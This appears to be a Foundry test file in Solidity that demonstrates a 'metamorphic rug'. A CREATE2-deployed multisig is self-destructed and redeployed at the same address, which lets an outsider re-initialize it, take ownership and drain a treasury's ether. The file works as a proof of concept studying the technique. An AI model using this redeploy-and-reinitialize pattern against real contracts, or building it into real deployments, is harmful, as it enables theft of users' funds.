// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {MetamorphicFactory} from "./MetamorphicFactory.sol";
import {Multisig} from "./Multisig.sol";
import {Treasury} from "./Treasury.sol";
import {Destroy} from "./Destroy.sol";

contract MetamorphicRug is Test {
    MetamorphicFactory public factoryContract;
	address payable public multisigAddr;
	address public treasuryAddr;

    function setUp() public {
        factoryContract = new MetamorphicFactory();
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		multisigAddr =  payable(factoryContract.deploy(1, bytecode));

		// initilize multisig owner
		address multisigOwner = address(1234);
		vm.prank(multisigOwner);
		Multisig(multisigAddr).initialize();

		// Never make assertions in the setUp function. Failed assertions won't result with failed test.
		// But if the test fails, failed assert will be visible
		// https://book.getfoundry.sh/tutorials/best-practices?highlight=setup#general-test-guidance
		assertEq(Multisig(multisigAddr).owner(), multisigOwner);

		treasuryAddr = address(new Treasury());
		vm.prank(multisigAddr);
		Treasury(treasuryAddr).initialize();
		assertEq(Treasury(treasuryAddr).owner(), multisigAddr);

		// The selfdestruct call must be done in setUp() due to a foundry limitation: https://github.com/foundry-rs/foundry/issues/1543
        address destroyAddr = address(new Destroy());
		vm.prank(multisigOwner);
		Multisig(multisigAddr).transferFromContract(destroyAddr);

		// mine some blocks
		vm.roll(block.number + 10);
	}

	function testMetamorphicRug() public {
		vm.deal(treasuryAddr, 1 ether);
		assertEq(treasuryAddr.balance, 1 ether);
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		address payable newMultisigAddr =  payable(factoryContract.deploy(1, bytecode));
		assertEq(newMultisigAddr, multisigAddr);
		assertEq(Treasury(treasuryAddr).owner(), newMultisigAddr);

		// bob can initialize new multisig with him as owner
		address bob = address(99);
		vm.prank(bob);
		Multisig(multisigAddr).initialize();
		assertEq(Multisig(multisigAddr).owner(), bob);

		// new multisig contract can transfer all funds from treasruy
		vm.prank(multisigAddr);
		Treasury(treasuryAddr).transfer();
		assertEq(treasuryAddr.balance, 0);
		assertEq(multisigAddr.balance, 1 ether);

		// bob can transfer all funds to him self
		assertEq(bob.balance, 0);
		vm.prank(bob);
		Multisig(multisigAddr).collect();
		assertEq(multisigAddr.balance, 0);
		assertEq(bob.balance, 1 ether);
	}

	// deploying the same contract with the same salt will produce the same address
	function testTheSameContract() public {
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		address payable newMultisigAddr =  payable(factoryContract.deploy(1, bytecode));
		assertEq(newMultisigAddr, multisigAddr);
	}

	// deploying the same contract but with a different salt will produce a different address
	function testDifferentSalt() public {
        bytes memory bytecode = abi.encodePacked(vm.getCode("Multisig.sol"));
		address payable newMultisigAddr =  payable(factoryContract.deploy(2, bytecode));

		// different salt will produce different address
		assertTrue(multisigAddr != newMultisigAddr);
	}
}
